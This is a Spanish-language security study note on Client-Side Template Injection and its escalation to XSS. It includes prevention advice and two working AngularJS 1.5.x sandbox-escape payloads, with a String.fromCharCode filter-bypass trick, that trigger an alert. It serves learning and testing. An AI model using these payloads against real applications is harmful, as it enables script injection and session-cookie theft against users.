# Client-Side Template Injection (CSTI)

Tags: #CSTI #OWASP #Explotacion 

* [HackTricks](https://book.hacktricks.xyz/welcome/readme)
* [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

El **Client-Side Template Injection** (**CSTI**) es una vulnerabilidad de seguridad en la que un atacante puede inyectar código malicioso en una **plantilla de cliente**, que se ejecuta en el **navegador** del usuario en lugar del servidor.

A diferencia del **Server-Side Template Injection** (**SSTI**), en el que la plantilla de servidor se ejecuta en el servidor y es responsable de generar el contenido dinámico, en el CSTI, la plantilla de cliente se ejecuta en el navegador del usuario y se utiliza para generar contenido dinámico en el lado del cliente.

Los atacantes pueden aprovechar una vulnerabilidad de CSTI para inyectar código malicioso en una plantilla de cliente, lo que les permite ejecutar comandos en el navegador del usuario y obtener acceso no autorizado a la aplicación web y a los datos sensibles.

Por ejemplo, imagina que una aplicación web utiliza plantillas de cliente para generar contenido dinámico. Un atacante podría aprovechar una vulnerabilidad de CSTI para inyectar código malicioso en la plantilla de cliente, lo que permitiría al atacante ejecutar comandos en el navegador del usuario y obtener acceso no autorizado a los datos sensibles de la aplicación web.

Una derivación común en un ataque de Client-Side Template Injection (CSTI) es aprovecharlo para realizar un ataque de **Cross-Site Scripting** (**XSS**).

Una vez que un atacante ha inyectado código malicioso en la plantilla de cliente, puede manipular los datos que se muestran al usuario, lo que le permite ejecutar código JavaScript en el navegador del usuario. A través de este código malicioso, el atacante puede intentar robar la cookie de sesión del usuario, lo que le permitiría obtener acceso no autorizado a la cuenta del usuario y realizar acciones maliciosas en su nombre.

Para prevenir los ataques de CSTI, los desarrolladores de aplicaciones web deben validar y filtrar adecuadamente la entrada del usuario y utilizar herramientas y frameworks de plantillas seguros que implementen medidas de seguridad para prevenir la inyección de código malicioso.

## Comandos 

Este tipo de vulnerabilidades, se testea de la misma manera que un SSTI.

Podemos buscar en **PayloadAllTheThings** y buscamos (Client Site Template Injection). Podemos observar que contempla **Angular Js** 
* [Payload-AngularJs](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md)

Para la version de 1.5.9 - 1.5.11 de Angular Js
```bash
{{
    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;
    c.$apply=$apply;c.$eval=b;op=$root.$$phase;
    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
    B=C(b,c,b);$evalAsync("
    astNode=pop();astNode.type='UnaryExpression';
    astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';
    astNode.argument={type:'Identifier',name:'foo'};
    ");
    m1=B($$asyncQueue.pop().expression,null,$root);
    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
    $eval('a(b.c)');[].push.apply=a;
}}
```

Angular a veces no permite caracteres, por lo que debemos de hacer lo siguiente para representar los caracteres y así los pueda procesar. Esto se hará con la siguiente función y el carácter en Decimal.
```bash
❯ String.fromCharCode(97)                   # a = 97 dec y el resul;tado es 'a'
❯ String.fromCharCode(97,98)                # a = 97 dec, b = 98 dec y el resultado es 'ab'
``` 

Modificamos la parte del alert y ahí colocamos lo anterior. La palabra que agregaremos será PWNED = 80,87,78,69,68
```bash
{{
    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;
    c.$apply=$apply;c.$eval=b;op=$root.$$phase;
    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
    B=C(b,c,b);$evalAsync("
    astNode=pop();astNode.type='UnaryExpression';
    astNode.operator='(window.X?void0:(window.X=true,alert(String.fromCharCode(80,87,78,69,68))))+';  
    astNode.argument={type:'Identifier',name:'foo'};
    ");
    m1=B($$asyncQueue.pop().expression,null,$root);
    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
    $eval('a(b.c)');[].push.apply=a;
}}
```